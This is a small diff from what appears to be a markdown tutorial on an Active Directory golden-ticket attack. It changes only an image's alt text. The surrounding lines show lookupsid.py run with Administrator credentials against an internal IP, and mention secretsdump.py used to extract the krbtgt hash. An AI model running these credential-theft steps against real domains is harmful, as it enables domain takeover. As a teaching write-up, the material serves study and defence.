@@ -66,7 +66,7 @@ python3 lookupsid.py user/Administrator:password@ip
 python3 lookupsid.py admin/Administrator:p@ssw0rd@192.168.128.140
 ```
 
-<img src="/img/golden/sidk.PNG" alt="Getting-gz"width="1000" height="200"> 
+<img src="/img/golden/sidk.PNG" alt="Getting-gz "width="1000" height="200"> 
 
 used secretsdump.py the python script for extracting Krbtgt hash
 ```
